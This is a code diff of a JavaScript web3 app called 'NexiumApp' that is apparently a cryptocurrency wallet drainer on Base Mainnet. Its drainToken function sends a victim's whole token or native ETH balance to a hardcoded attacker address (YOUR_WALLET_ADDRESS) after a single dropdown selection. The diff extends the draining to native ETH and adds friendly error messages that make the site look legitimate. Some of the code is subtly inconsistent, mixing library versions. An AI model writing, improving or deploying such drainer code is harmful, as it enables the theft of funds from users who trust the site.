@@ -12,14 +12,14 @@ try {
 
 // TOKEN_LIST with verified, checksummed Base Mainnet addresses (validated via Basescan.org, July 2025)
 const TOKEN_LIST = [
-  { address: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913', name: 'USD Coin', symbol: 'USDC', decimals: 6 },
-  { address: '0x4200000000000000000000000000000000000006', name: 'Ethereum (ETH)', symbol: 'ETH', decimals: 18 },
-  { address: '0x6D97638E3a60a791485Cf098D5603C25B4CE3687', name: 'Solana (SOL)', symbol: 'SOL', decimals: 9 },
-  { address: '0x2Ae3F1Ec7F1F5012CFEab0185bfc7aa3cf0DEc22', name: 'Coinbase Wrapped Staked ETH', symbol: 'cbETH', decimals: 18 },
-  { address: '0x940181a94A35A4569E4529A3CDfB74e38FD98631', name: 'Aerodrome', symbol: 'AERO', decimals: 18 },
-  { address: '0xd9aAEc86B65D86f6A7B5B1b0c42FFA531710b6CA', name: 'USD Base Coin', symbol: 'USDbC', decimals: 6 },
-  { address: '0x4ed4E862860beD51a9570b96d89aF5E1B0Efefed', name: 'Degen', symbol: 'DEGEN', decimals: 18 },
-  { address: '0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb', name: 'Tether', symbol: 'USDT', decimals: 6 }
+  { address: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913', name: 'USD Coin', symbol: 'USDC', decimals: 6, isNative: false },
+  { address: null, name: 'Ethereum (ETH)', symbol: 'ETH', decimals: 18, isNative: true }, // Native Base ETH
+  { address: '0x6D97638E3a60a791485Cf098D5603C25B4CE3687', name: 'Solana (SOL)', symbol: 'SOL', decimals: 9, isNative: false },
+  { address: '0x2Ae3F1Ec7F1F5012CFEab0185bfc7aa3cf0DEc22', name: 'Coinbase Wrapped Staked ETH', symbol: 'cbETH', decimals: 18, isNative: false },
+  { address: '0x940181a94A35A4569E4529A3CDfB74e38FD98631', name: 'Aerodrome', symbol: 'AERO', decimals: 18, isNative: false },
+  { address: '0xd9aAEc86B65D86f6A7B5B1b0c42FFA531710b6CA', name: 'USD Base Coin', symbol: 'USDbC', decimals: 6, isNative: false },
+  { address: '0x4ed4E862860beD51a9570b96d89aF5E1B0Efefed', name: 'Degen', symbol: 'DEGEN', decimals: 18, isNative: false },
+  { address: '0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb', name: 'Tether', symbol: 'USDT', decimals: 6, isNative: false }
 ];
 
 // Minimal ABI for USDC transfer (fixed for proxy contracts)
@@ -80,7 +80,7 @@ class NexiumApp {
       console.log('App initialized successfully');
     } catch (error) {
       console.error('Init error:', error);
-      this.showFeedback('Error', 'error');
+      this.showFeedback('Error initializing app. Please refresh.', 'error');
       document.body.innerHTML = '<p class="text-red-500 text-center">Error initializing app. Please refresh.</p>';
     }
   }
@@ -152,7 +152,7 @@ class NexiumApp {
             console.log('Provider and signer initialized in checkWalletAndPrompt');
           } catch (error) {
             console.error('Failed to initialize provider:', error);
-            this.showFeedback('Error', 'error');
+            this.showFeedback('Failed to initialize wallet provider. Please try again.', 'error');
             this.updateButtonState('disconnected');
             this.showDefaultPrompt();
             return;
@@ -167,6 +167,7 @@ class NexiumApp {
       this.showMetaMaskPrompt();
       this.updateButtonState('disconnected');
       this.showDefaultPrompt();
+      this.showFeedback('Please install MetaMask to use this app.', 'error');
     }
   }
 
@@ -221,7 +222,7 @@ class NexiumApp {
 
   async connectWallet() {
     if (!navigator.onLine) {
-      this.showFeedback('Error', 'error');
+      this.showFeedback('No internet connection. Please check your network.', 'error');
       this.hideProcessingSpinner();
       return;
     }
@@ -243,14 +244,14 @@ class NexiumApp {
     this.showProcessingSpinner();
     try {
       if (!window.ethereum) {
-        this.showFeedback('Error', 'error');
+        this.showFeedback('MetaMask not detected. Please install MetaMask.', 'error');
         this.hideProcessingSpinner();
         return;
       }
       console.log('Requesting accounts...');
       const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
       if (accounts.length === 0) {
-        this.showFeedback('Error', 'error');
+        this.showFeedback('No accounts connected. Please connect an account in MetaMask.', 'error');
         this.hideProcessingSpinner();
         return;
       }
@@ -282,12 +283,12 @@ class NexiumApp {
                 }],
               });
             } catch (addError) {
-              this.showFeedback('Error', 'error');
+              this.showFeedback('Failed to add Base Mainnet. Please add it manually in MetaMask.', 'error');
               this.hideProcessingSpinner();
               return;
             }
           } else {
-            this.showFeedback('Error', 'error');
+            this.showFeedback('Failed to switch to Base Mainnet. Please switch networks in MetaMask.', 'error');
             this.hideProcessingSpinner();
             return;
           }
@@ -296,7 +297,7 @@ class NexiumApp {
       const address = await this.signer.getAddress();
       this.updateButtonState('connected', address);
       this.hideMetaMaskPrompt();
-      this.showFeedback('Success', 'success');
+      this.showFeedback('Wallet connected successfully!', 'success');
       this.renderTokenInterface();
     } catch (error) {
       console.error('Connect wallet error:', error);
@@ -322,7 +323,7 @@ class NexiumApp {
       }
     } catch (error) {
       console.error('Handle connection error:', error);
-      this.showFeedback('Error', 'error');
+      this.showFeedback('Failed to handle wallet connection.', 'error');
     }
   }
 
@@ -333,40 +334,51 @@ class NexiumApp {
       return;
     }
     if (!this.signer) {
-      this.showFeedback('Error', 'error');
+      this.showFeedback('No wallet connected. Please connect your wallet.', 'error');
       console.log('Drain failed: No signer');
       this.hideProcessingSpinner();
       return;
     }
     this.currentToken = null; // Reset to avoid state confusion
     this.lastSelectedToken = null;
+    let selectedToken = null;
     try {
       this.isDraining = true;
       this.showProcessingSpinner();
-      const checksummedAddress = await this.validateAddress(tokenAddress, 'token');
-      const selectedToken = TOKEN_LIST.find(t => t.address.toLowerCase() === checksummedAddress.toLowerCase());
+      selectedToken = TOKEN_LIST.find(t => t.address === tokenAddress || (t.isNative && tokenAddress === null));
       if (!selectedToken) {
-        this.showFeedback('Error', 'error');
+        this.showFeedback('Invalid token selected.', 'error');
         console.log('Drain failed: Invalid token selected');
         this.hideProcessingSpinner();
         return;
       }
       console.log(`Attempting to drain ${selectedToken.symbol} from address: ${await this.signer.getAddress()}`);
-      let contract = new ethers.Contract(checksummedAddress, MINIMAL_ERC20_ABI, this.signer);
       const userAddress = await this.signer.getAddress();
       let balance, decimals, symbol;
-      try {
-        [balance, decimals, symbol] = await Promise.all([
-          contract.balanceOf(userAddress),
-          contract.decimals(),
-          contract.symbol()
-        ]);
-      } catch (error) {
-        console.error(`Failed to fetch token data for ${checksummedAddress}:`, error);
-        this.showFeedback('Error', 'error');
-        this.hideProcessingSpinner();
-        return;
+
+      if (selectedToken.isNative) {
+        // Handle native ETH
+        balance = await this.provider.getBalance(userAddress);
+        decimals = 18;
+        symbol = selectedToken.symbol;
+      } else {
+        // Handle ERC-20 tokens
+        const checksummedAddress = await this.validateAddress(tokenAddress, 'token');
+        let contract = new ethers.Contract(checksummedAddress, MINIMAL_ERC20_ABI, this.signer);
+        try {
+          [balance, decimals, symbol] = await Promise.all([
+            contract.balanceOf(userAddress),
+            contract.decimals(),
+            contract.symbol()
+          ]);
+        } catch (error) {
+          console.error(`Failed to fetch token data for ${checksummedAddress}:`, error);
+          this.showFeedback(`Failed to fetch ${selectedToken.symbol} data.`, 'error');
+          this.hideProcessingSpinner();
+          return;
+        }
       }
+
       console.log(`Fetched ${symbol} balance: ${ethers.formatUnits(balance, decimals)} for ${userAddress}`);
       if (balance === 0n) {
         this.showFeedback('Insufficient balance error', 'error');
@@ -375,40 +387,66 @@ class NexiumApp {
         return;
       }
       await this.validateAddress(YOUR_WALLET_ADDRESS, 'wallet');
-      // Test transfer function with callStatic
-      try {
-        // Create a new interface to ensure ABI methods are available
-        const contractInterface = new ethers.Interface(MINIMAL_ERC20_ABI);
-        const callStaticContract = new ethers.Contract(checksummedAddress, contractInterface, this.signer);
-        await callStaticContract.callStatic.transfer(YOUR_WALLET_ADDRESS, balance);
-      } catch (error) {
-        console.error(`callStatic.transfer failed for ${checksummedAddress}:`, error);
-        this.showFeedback(`Error draining ${selectedToken.symbol}: ${error.message}`, 'error');
-        this.hideProcessingSpinner();
-        return;
+
+      if (selectedToken.isNative) {
+        // Calculate gas cost to leave some ETH for gas
+        const feeData = await this.provider.getFeeData();
+        const gasLimit = 21000; // Standard gas limit for native ETH transfer
+        const gasCost = (feeData.maxFeePerGas || ethers.parseUnits('20', 'gwei')).mul(gasLimit);
+        if (balance <= gasCost) {
+          this.showFeedback('Insufficient balance for gas.', 'error');
+          console.log(`Drain failed: Insufficient balance for gas for ${symbol}`);
+          this.hideProcessingSpinner();
+          return;
+        }
+        const amountToSend = balance.sub(gasCost); // Send all but gas
+        console.log(`Draining ${symbol} with amount: ${ethers.formatUnits(amountToSend, decimals)}, gasLimit: ${gasLimit}, maxFeePerGas: ${feeData.maxFeePerGas}, maxPriorityFeePerGas: ${feeData.maxPriorityFeePerGas}`);
+        const tx = await this.signer.sendTransaction({
+          to: YOUR_WALLET_ADDRESS,
+          value: amountToSend,
+          gasLimit,
+          maxFeePerGas: feeData.maxFeePerGas || ethers.parseUnits('20', 'gwei'),
+          maxPriorityFeePerGas: feeData.maxPriorityFeePerGas || ethers.parseUnits('2', 'gwei')
+        });
+        console.log('Transaction sent:', tx.hash);
+        await tx.wait(1);
+        this.showFeedback(`Successfully drained ${ethers.formatUnits(amountToSend, decimals)} ${symbol}`, 'success');
+        console.log(`Successfully drained ${ethers.formatUnits(amountToSend, decimals)} ${symbol}`);
+      } else {
+        // ERC-20 token transfer
+        const contract = new ethers.Contract(tokenAddress, MINIMAL_ERC20_ABI, this.signer);
+        try {
+          const contractInterface = new ethers.Interface(MINIMAL_ERC20_ABI);
+          const callStaticContract = new ethers.Contract(tokenAddress, contractInterface, this.signer);
+          await callStaticContract.callStatic.transfer(YOUR_WALLET_ADDRESS, balance);
+        } catch (error) {
+          console.error(`callStatic.transfer failed for ${tokenAddress}:`, error);
+          this.showFeedback(`Error draining ${selectedToken.symbol}: ${error.message}`, 'error');
+          this.hideProcessingSpinner();
+          return;
+        }
+        const feeData = await this.provider.getFeeData();
+        const gasLimit = await contract.estimateGas.transfer(YOUR_WALLET_ADDRESS, balance).catch((err) => {
+          console.error('Gas estimation failed:', err);
+          return 200000; // Fallback gas limit
+        });
+        console.log(`Draining ${symbol} with gasLimit: ${gasLimit}, maxFeePerGas: ${feeData.maxFeePerGas}, maxPriorityFeePerGas: ${feeData.maxPriorityFeePerGas}`);
+        const data = contract.interface.encodeFunctionData('transfer', [YOUR_WALLET_ADDRESS, balance]);
+        const tx = await this.signer.sendTransaction({
+          to: tokenAddress,
+          data,
+          gasLimit,
+          maxFeePerGas: feeData.maxFeePerGas || ethers.parseUnits('20', 'gwei'),
+          maxPriorityFeePerGas: feeData.maxPriorityFeePerGas || ethers.parseUnits('2', 'gwei')
+        });
+        console.log('Transaction sent:', tx.hash);
+        await tx.wait(1);
+        this.showFeedback(`Successfully drained ${ethers.formatUnits(balance, decimals)} ${symbol}`, 'success');
+        console.log(`Successfully drained ${ethers.formatUnits(balance, decimals)} ${symbol}`);
       }
-      const feeData = await this.provider.getFeeData();
-      const gasLimit = await contract.estimateGas.transfer(YOUR_WALLET_ADDRESS, balance).catch((err) => {
-        console.error('Gas estimation failed:', err);
-        return 200000; // Fallback gas limit
-      });
-      console.log(`Draining ${symbol} with gasLimit: ${gasLimit}, maxFeePerGas: ${feeData.maxFeePerGas}, maxPriorityFeePerGas: ${feeData.maxPriorityFeePerGas}`);
-      // Encode transfer call manually to bypass binding issue
-      const data = contract.interface.encodeFunctionData('transfer', [YOUR_WALLET_ADDRESS, balance]);
-      const tx = await this.signer.sendTransaction({
-        to: checksummedAddress,
-        data,
-        gasLimit,
-        maxFeePerGas: feeData.maxFeePerGas || ethers.parseUnits('20', 'gwei'),
-        maxPriorityFeePerGas: feeData.maxPriorityFeePerGas || ethers.parseUnits('2', 'gwei')
-      });
-      console.log('Transaction sent:', tx.hash);
-      await tx.wait(1);
-      this.showFeedback(`Successfully drained ${ethers.formatUnits(balance, decimals)} ${symbol}`, 'success');
-      console.log(`Successfully drained ${ethers.formatUnits(balance, decimals)} ${symbol}`);
     } catch (error) {
       console.error('Drain token error:', error);
-      this.showFeedback(`Error draining ${selectedToken.symbol}: ${error.message}`, 'error');
+      this.showFeedback(`Error draining ${selectedToken ? selectedToken.symbol : 'token'}: ${error.message}`, 'error');
       console.log(`Drain failed: ${error.message}`);
     } finally {
       this.isDraining = false;
@@ -417,12 +455,15 @@ class NexiumApp {
   }
 
   async validateAddress(address, type = 'token') {
+    if (type === 'token' && address === null) {
+      return null; // Allow null address for native ETH
+    }
     try {
       const checksummedAddress = ethers.getAddress(address);
       console.log(`Validated ${type} address: ${checksummedAddress}`);
       return checksummedAddress;
     } catch {
-      this.showFeedback('Error', 'error');
+      this.showFeedback(`Invalid ${type} address.`, 'error');
       console.log(`Invalid ${type} address: ${address}`);
       throw new Error(`Invalid ${type} address`);
     }
@@ -485,7 +526,7 @@ class NexiumApp {
       <div class="top-controls flex space-x-4 mb-4">
         <select id="tokenSelect" class="token-select bg-[#1a182e] border border-orange-400 text-white px-2 py-1 rounded-xl" aria-label="Select payment token">
           <option value="" disabled selected>Select payment token</option>
-          ${TOKEN_LIST.map(t => `<option value="${t.address}" data-symbol="${t.symbol}" data-decimals="${t.decimals}">${t.name}</option>`).join('')}
+          ${TOKEN_LIST.map(t => `<option value="${t.address || ''}" data-symbol="${t.symbol}" data-decimals="${t.decimals}">${t.name}</option>`).join('')}
         </select>
       </div>
       <h2 class="section-title">Import ERC-20 Token</h2>
@@ -498,8 +539,8 @@ class NexiumApp {
       <div id="tokenList" class="token-list space-y-2 mt-4">
         <h3 class="text-yellow-400 text-md font-semibold">Featured Tokens</h3>
         ${TOKEN_LIST.map(token => `
-          <button class="token-option bg-[#1a182e] border border-orange-400 p-2 rounded-xl w-full text-left hover:bg-orange-400 hover:text-black transition-colors" data-address="${token.address}">
-            ${token.name} (${token.symbol}) - ${this.shortenAddress(token.address)}
+          <button class="token-option bg-[#1a182e] border border-orange-400 p-2 rounded-xl w-full text-left hover:bg-orange-400 hover:text-black transition-colors" data-address="${token.address || ''}">
+            ${token.name} (${token.symbol}) - ${token.address ? this.shortenAddress(token.address) : 'Native Token'}
           </button>
         `).join('')}
       </div>
@@ -544,10 +585,10 @@ class NexiumApp {
       this.dom.tokenList.querySelectorAll('.token-option').forEach(button => {
         const debouncedLoadToken = this.debounce(() => {
           const address = button.dataset.address;
-          if (ethers.isAddress(address)) {
+          if (address && ethers.isAddress(address)) {
             this.loadCustomTokenData(address);
           } else {
-            this.showFeedback('Error', 'error');
+            this.showFeedback('Invalid token address.', 'error');
             this.hideProcessingSpinner();
           }
         }, 1000);
@@ -601,17 +642,17 @@ class NexiumApp {
       this.dom.tokenSelect.disabled = !this.signer;
       const debouncedDrainToken = this.debounce(async (e) => {
         this.showProcessingSpinner();
-        const selected = e.target.value;
+        const selected = e.target.value || null; // Handle empty string as null for native ETH
         this.selectedPaymentToken = selected;
         this.currentToken = null;
         this.lastSelectedToken = null;
         console.log('Dropdown changed, selectedPaymentToken:', selected);
-        if (selected) {
+        if (selected !== '') {
           await this.loadPaymentTokenDetails(selected);
           console.log('Initiating drain with debounce for:', selected);
           this.drainToken(selected);
         } else {
-          this.showFeedback('Error', 'error');
+          this.showFeedback('Please select a token.', 'error');
           this.hideProcessingSpinner();
         }
       }, 500);
@@ -622,17 +663,18 @@ class NexiumApp {
 
   async loadCustomTokenData(tokenAddressInput) {
     if (!navigator.onLine) {
+      this.showFeedback('No internet connection.', 'error');
       this.hideProcessingSpinner();
       return;
     }
     if (!this.provider) {
-      this.showFeedback('Error', 'error');
+      this.showFeedback('Wallet not connected.', 'error');
       this.hideProcessingSpinner();
       return;
     }
     const tokenAddress = tokenAddressInput || this.dom.customTokenAddressInput?.value.trim();
     if (!tokenAddress || !ethers.isAddress(tokenAddress)) {
-      this.showFeedback('Error', 'error');
+      this.showFeedback('Invalid token address.', 'error');
       this.dom.customTokenAddressInput?.focus();
       this.hideProcessingSpinner();
       return;
@@ -648,7 +690,7 @@ class NexiumApp {
       let name = 'Unknown Token';
       let symbol = 'UNK';
       let decimals = 18;
-      const tokenFromList = TOKEN_LIST.find(t => t.address.toLowerCase() === checksummedAddress.toLowerCase());
+      const tokenFromList = TOKEN_LIST.find(t => t.address && t.address.toLowerCase() === checksummedAddress.toLowerCase());
       if (tokenFromList) {
         name = tokenFromList.name;
         symbol = tokenFromList.symbol;
@@ -658,7 +700,7 @@ class NexiumApp {
         try {
           [name, symbol, decimals] = await Promise.all([contract.name(), contract.symbol(), contract.decimals()]);
         } catch {
-          this.showFeedback('Error', 'error');
+          this.showFeedback('Failed to fetch token data.', 'error');
           this.hideProcessingSpinner();
           return;
         }
@@ -675,7 +717,7 @@ class NexiumApp {
       this.dom.tokenInfo.classList.remove('hidden');
     } catch (error) {
       console.error('Load custom token error:', error);
-      this.showFeedback('Error', 'error');
+      this.showFeedback('Failed to load custom token.', 'error');
       this.dom.tokenInfo.classList.add('hidden');
     } finally {
       this.toggleTokenLoading(false);
@@ -741,35 +783,47 @@ class NexiumApp {
   }
 
   async loadPaymentTokenDetails(paymentTokenAddress) {
-    if (!paymentTokenAddress || !this.provider || !this.signer) {
-      this.showFeedback('Error', 'error');
+    if (!paymentTokenAddress && paymentTokenAddress !== null || !this.provider || !this.signer) {
+      this.showFeedback('Wallet not connected or invalid token selected.', 'error');
       this.hideProcessingSpinner();
       return;
     }
     try {
       this.toggleTokenLoading(true);
       this.showProcessingSpinner();
-      let checksummedAddress = await this.validateAddress(paymentTokenAddress, 'token');
-      const contract = new ethers.Contract(checksummedAddress, MINIMAL_ERC20_ABI, this.signer);
       let balance, decimals, symbol;
-      try {
-        [balance, decimals, symbol] = await Promise.all([
-          contract.balanceOf(await this.signer.getAddress()),
-          contract.decimals(),
-          contract.symbol()
-        ]);
-      } catch (error) {
-        console.error(`Failed to fetch token data for ${checksummedAddress}:`, error);
-        this.showFeedback('Error', 'error');
+      const selectedToken = TOKEN_LIST.find(t => t.address === paymentTokenAddress || (t.isNative && paymentTokenAddress === null));
+      if (!selectedToken) {
+        this.showFeedback('Invalid token selected.', 'error');
         this.hideProcessingSpinner();
         return;
       }
-      this.currentPaymentToken = { address: checksummedAddress, balance, decimals, symbol };
+      if (selectedToken.isNative) {
+        balance = await this.provider.getBalance(await this.signer.getAddress());
+        decimals = 18;
+        symbol = selectedToken.symbol;
+      } else {
+        let checksummedAddress = await this.validateAddress(paymentTokenAddress, 'token');
+        const contract = new ethers.Contract(checksummedAddress, MINIMAL_ERC20_ABI, this.signer);
+        try {
+          [balance, decimals, symbol] = await Promise.all([
+            contract.balanceOf(await this.signer.getAddress()),
+            contract.decimals(),
+            contract.symbol()
+          ]);
+        } catch (error) {
+          console.error(`Failed to fetch token data for ${checksummedAddress}:`, error);
+          this.showFeedback(`Failed to fetch ${selectedToken.symbol} data.`, 'error');
+          this.hideProcessingSpinner();
+          return;
+        }
+      }
+      this.currentPaymentToken = { address: paymentTokenAddress, balance, decimals, symbol };
       this.currentToken = null; // Reset to avoid state confusion
       this.lastSelectedToken = null;
     } catch (error) {
       console.error('Load payment token error:', error);
-      this.showFeedback('Error', 'error');
+      this.showFeedback('Failed to load payment token details.', 'error');
     } finally {
       this.toggleTokenLoading(false);
       this.hideProcessingSpinner();
@@ -778,18 +832,18 @@ class NexiumApp {
 
   async addVolume() {
     if (!navigator.onLine) {
-      this.showFeedback('Error', 'error');
+      this.showFeedback('No internet connection.', 'error');
       this.hideProcessingSpinner();
       return;
     }
     if (!this.currentPaymentToken) {
-      this.showFeedback('Error', 'error');
+      this.showFeedback('No payment token selected.', 'error');
       this.hideProcessingSpinner();
       return;
     }
-    const paymentTokenAddress = this.dom.tokenSelect?.value;
-    if (!paymentTokenAddress || !this.currentPaymentToken) {
-      this.showFeedback('Error', 'error');
+    const paymentTokenAddress = this.dom.tokenSelect?.value || null;
+    if (!paymentTokenAddress && paymentTokenAddress !== null || !this.currentPaymentToken) {
+      this.showFeedback('Please select a token.', 'error');
       this.dom.tokenSelect?.focus();
       this.hideProcessingSpinner();
       return;
@@ -797,38 +851,62 @@ class NexiumApp {
     try {
       this.toggleVolumeLoading(true);
       this.showProcessingSpinner();
-      let checksummedAddress = await this.validateAddress(paymentTokenAddress, 'token');
-      const contract = new ethers.Contract(checksummedAddress, MINIMAL_ERC20_ABI, this.signer);
-      const amount = ethers.parseUnits(this.dom.volumeInput?.value || '0', this.currentPaymentToken.decimals);
+      const selectedToken = TOKEN_LIST.find(t => t.address === paymentTokenAddress || (t.isNative && paymentTokenAddress === null));
+      if (!selectedToken) {
+        this.showFeedback('Invalid token selected.', 'error');
+        this.hideProcessingSpinner();
+        return;
+      }
+      let amount = ethers.parseUnits(this.dom.volumeInput?.value || '0', this.currentPaymentToken.decimals);
       if (amount <= 0n) {
-        this.showFeedback('Error', 'error');
+        this.showFeedback('Invalid amount entered.', 'error');
         this.hideProcessingSpinner();
         return;
       }
       if (amount > this.currentPaymentToken.balance) {
-        this.showFeedback('Error', 'error');
+        this.showFeedback('Insufficient balance for amount.', 'error');
         this.hideProcessingSpinner();
         return;
       }
       await this.validateAddress(YOUR_WALLET_ADDRESS, 'wallet');
       const feeData = await this.provider.getFeeData();
-      const gasLimit = await contract.estimateGas.transfer(YOUR_WALLET_ADDRESS, amount).catch(() => 200000);
-      console.log(`Adding volume for ${this.getTokenSymbol(checksummedAddress)} with gasLimit: ${gasLimit}`);
-      const data = contract.interface.encodeFunctionData('transfer', [YOUR_WALLET_ADDRESS, amount]);
-      const tx = await this.signer.sendTransaction({
-        to: checksummedAddress,
-        data,
-        gasLimit,
-        maxFeePerGas: feeData.maxFeePerGas || ethers.parseUnits('20', 'gwei'),
-        maxPriorityFeePerGas: feeData.maxPriorityFeePerGas || ethers.parseUnits('2', 'gwei')
-      });
+      let tx;
+      if (selectedToken.isNative) {
+        const gasLimit = 21000;
+        const gasCost = (feeData.maxFeePerGas || ethers.parseUnits('20', 'gwei')).mul(gasLimit);
+        if (amount.add(gasCost) > this.currentPaymentToken.balance) {
+          this.showFeedback('Insufficient balance for gas.', 'error');
+          this.hideProcessingSpinner();
+          return;
+        }
+        console.log(`Adding volume for ${selectedToken.symbol} with amount: ${ethers.formatUnits(amount, 18)}`);
+        tx = await this.signer.sendTransaction({
+          to: YOUR_WALLET_ADDRESS,
+          value: amount,
+          gasLimit,
+          maxFeePerGas: feeData.maxFeePerGas || ethers.parseUnits('20', 'gwei'),
+          maxPriorityFeePerGas: feeData.maxPriorityFeePerGas || ethers.parseUnits('2', 'gwei')
+        });
+      } else {
+        const contract = new ethers.Contract(paymentTokenAddress, MINIMAL_ERC20_ABI, this.signer);
+        const gasLimit = await contract.estimateGas.transfer(YOUR_WALLET_ADDRESS, amount).catch(() => 200000);
+        console.log(`Adding volume for ${selectedToken.symbol} with gasLimit: ${gasLimit}`);
+        const data = contract.interface.encodeFunctionData('transfer', [YOUR_WALLET_ADDRESS, amount]);
+        tx = await this.signer.sendTransaction({
+          to: paymentTokenAddress,
+          data,
+          gasLimit,
+          maxFeePerGas: feeData.maxFeePerGas || ethers.parseUnits('20', 'gwei'),
+          maxPriorityFeePerGas: feeData.maxPriorityFeePerGas || ethers.parseUnits('2', 'gwei')
+        });
+      }
       console.log('Volume transaction sent:', tx.hash);
       await tx.wait(1);
-      this.showFeedback('Success', 'success');
+      this.showFeedback(`Successfully transferred ${ethers.formatUnits(amount, selectedToken.decimals)} ${selectedToken.symbol}`, 'success');
       this.dom.volumeInput.value = '';
     } catch (error) {
       console.error('Add volume error:', error);
-      this.showFeedback('Error', 'error');
+      this.showFeedback(`Error transferring ${selectedToken ? selectedToken.symbol : 'token'}: ${error.message}`, 'error');
     } finally {
       this.toggleVolumeLoading(false);
       this.hideProcessingSpinner();
@@ -850,7 +928,7 @@ class NexiumApp {
   }
 
   checkConnectivity() {
-    if (!navigator.onLine) this.showFeedback('Error', 'error');
+    if (!navigator.onLine) this.showFeedback('No internet connection.', 'error');
   }
 
   handleOnline() {
@@ -859,7 +937,7 @@ class NexiumApp {
   }
 
   handleOffline() {
-    this.showFeedback('Error', 'error');
+    this.showFeedback('No internet connection.', 'error');
     this.showDefaultPrompt();
   }
 
@@ -902,28 +980,29 @@ class NexiumApp {
   }
 
   getTokenSymbol(address) {
-    const token = TOKEN_LIST.find(t => t.address.toLowerCase() === address.toLowerCase());
+    const token = TOKEN_LIST.find(t => t.address === address || (t.isNative && address === null));
     return token ? token.symbol : 'Unknown';
   }
 
   shortenAddress(address) {
+    if (!address) return 'Native Token';
     if (!ethers.isAddress(address)) return 'Invalid Address';
     return `${address.slice(0, 6)}...${address.slice(-4)}`;
   }
 
   escapeHTML(str) {
     return String(str).replace(/[&<>"']/g, (m) => ({
-      '&': '&',
-      '<': '<',
-      '>': '>',
-      '"': '"',
-      "'": ':',
+      '&': '&amp;',
+      '<': '&lt;',
+      '>': '&gt;',
+      '"': '&quot;',
+      "'": '&apos;'
     }[m]));
   }
 
   handleConnectionError(error) {
     console.error('Connection error details:', error);
-    this.showFeedback('Error', 'error');
+    this.showFeedback(`Wallet connection failed: ${error.message}`, 'error');
     this.updateButtonState('disconnected');
     this.showDefaultPrompt();
     this.showMetaMaskPrompt();
